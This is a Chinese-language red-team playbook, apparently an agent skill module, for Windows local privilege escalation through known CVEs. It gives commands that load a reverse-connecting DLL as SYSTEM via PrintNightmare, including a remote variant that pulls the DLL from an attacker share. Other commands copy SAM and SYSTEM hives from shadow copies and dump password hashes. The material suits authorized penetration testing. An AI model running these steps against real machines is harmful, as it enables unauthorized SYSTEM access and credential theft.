# Windows 本机 Kernel / 本地 CVE LPE

> **TECH：** 版本门控的本机 EoP  
> **IMPACT：** SYSTEM；错版本可能蓝屏  
> **原则：** 指纹 → `../../shared/cve-enrichment.md` → 公开稳定 PoC → 再执行。禁止按 CVE 名字盲打。

远程 PrintNightmare、MS-RPC 横向不是本文件。BYOVD 通用库、PPL 卸保护是 `/edr-bypass`（除非当前原语就是 `SeLoadDriver`，见 `token-privileges.md`）。

---

## 0. 指纹（每次必做）

```cmd
systeminfo
ver
wmic os get Caption,Version,BuildNumber
wmic qfe get HotFixID,InstalledOn
```

```powershell
Get-ComputerInfo | select WindowsProductName,WindowsVersion,OsBuildNumber
Get-HotFix | sort InstalledOn -Descending | select -First 30
Get-Service Spooler,WebClient | format-table Name,Status,StartType
```

记下：OS 名、build、UBR、最近 KB、是否 DC、HVCI。

然后：

```bash
vulnx id CVE-YYYY-NNNN
vulnx search 'microsoft && windows && is_kev:true && is_poc:true' --limit 20
```

MSRC 对照：https://msrc.microsoft.com/update-guide/vulnerability/CVE-YYYY-NNNN

WES-NG 可当本地 companion，**不能替代 MSRC**：

```bash
systeminfo > sysinfo.txt
python3 wes.py sysinfo.txt --exploits-only
```

---

## 短名单（仍要过 GATES）

| CVE | 谁能打 | 公开入口 | 不要打 |
|---|---|---|---|
| CVE-2023-21746 LocalPotato | 任意本地用户，无 SeImpersonate | `potato-family.md` | 已装 2023-01+ 累积 |
| CVE-2021-1675 / 34527 PrintNightmare **本地** | Spooler 开 + PointAndPrint/驱动安装仍弱 | SharpPrintNightmare | 远程横向；Spooler 关 |
| CVE-2021-36934 HiveNightmare | Users 对 SAM 的 VSS 副本可读 | 拷贝 `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN` | icacls 已修 |
| CVE-2023-29360 MSKSSRV | 版本门 + 公开 PoC | mskssrv.sys 逻辑洞 | 无匹配 build |
| CVE-2024-30088 | KEV，Win10/11/2022 一段 build | 公开 PoC + Rapid7 模块 | 无 PoC / 已补 |
| CVE-2025-24076 | Win11 23H2/24H2 Cross Device Service | EDB 52320 等，按 build | 不当通用路径 |

下面只写 **本模块要执行的本地配方**。新的 Patch Tuesday EoP 一律走 enrichment，命中再补进 notes，不要在 SKILL 里堆。

---

## PrintNightmare 本地

```cmd
sc query spooler
dir \\.\pipe\spoolss
```

Spooler 未运行 → 停。

```cmd
SharpPrintNightmare.exe C:\Users\Public\payload.dll
```

`payload.dll` 为 SYSTEM 上下文加载的 DLL（DllMain 回连）。成功 = SYSTEM shell。

远程：

```bash
python3 CVE-2021-1675.py corp.com/user:pass@TARGET '\\KALI\share\payload.dll'
```

这是横向，记候选 `/ad-recon` / `/service-attack`，本模块不把它当主路径。

### GATES

PointAndPrint 限制、2021-07 之后补丁、驱动安装策略。打之前 enrichment + 看 Spooler。失败不要循环打，Spooler 不稳定。

### RESTORE

停恶意打印驱动/删 DLL。可能需重启 Spooler：`net stop spooler & net start spooler`。

---

## HiveNightmare — CVE-2021-36934

```cmd
icacls C:\Windows\System32\config\SAM
vssadmin list shadows
```

Users 对 SAM 有 `(R)` 或存在可读 shadow：

```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Users\Public\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Users\Public\system
```

```bash
impacket-secretsdump -sam sam -system system LOCAL
```

成功 = 本地管理员哈希，再 PTH 到本机 SYSTEM/admin。完整域哈希归 `/creds`。

已修 ACL 且无旧 shadow → 不可用。

---

## MSKSSRV — CVE-2023-29360

Win11 22H2 附近、KB5027215 之前的公开逻辑洞。Theori 等有分析。

```cmd
sc query
systeminfo | findstr /i "OS Version"
```

必须：build 落在 advisory 范围 + 公开 PoC 支持该 build。PoC 随仓库变，不把过期 gist 当命令。无匹配就标 P2。

错版本风险：内核崩溃。先虚拟快照/授权靶场。

---

## CVE-2024-30088

CISA KEV。Win10 / Win11 / Server 2022 一段内核 TOCTOU。

```bash
vulnx id CVE-2024-30088
```

用 **当前公开、标明 tested build** 的 PoC（例如 ycdxsb/WindowsPrivilegeEscalation 索引、Rapid7 `cve_2024_30088_authz_basep`）。tested build ≠ 当前机器 → 不跑。

RESTORE：成功后 SYSTEM shell；失败可能需要 reboot。notes 写 CVE 和 build。

---

## CVE-2025-24076 Cross Device Service

EDB 52320 等针对 Win11 23H2/24H2 特定 build（如 10.0.26100.3476）。**只在指纹精确命中时**按 EDB/作者 README 执行。24H2 不等于可打。

---

## 通用 GATES

```text
精确 build / KB 对照 vendor advisory
公开 PoC 声明的 tested OS 包含当前系统
HVCI 不阻止该利用类
操作者接受蓝屏风险
有稳定回连，避免 exploit 把唯一 shell 打挂
```

P2（受影响但无稳定公开利用）：保留候选，**不编命令**。

## SOURCES

- https://msrc.microsoft.com/update-guide
- https://www.cisa.gov/known-exploited-vulnerabilities-catalog
- https://github.com/decoder-it/LocalPotato
- https://github.com/cube0x0/CVE-2021-1675
- https://nvd.nist.gov/vuln/detail/CVE-2024-30088
- https://www.exploit-db.com/exploits/52320
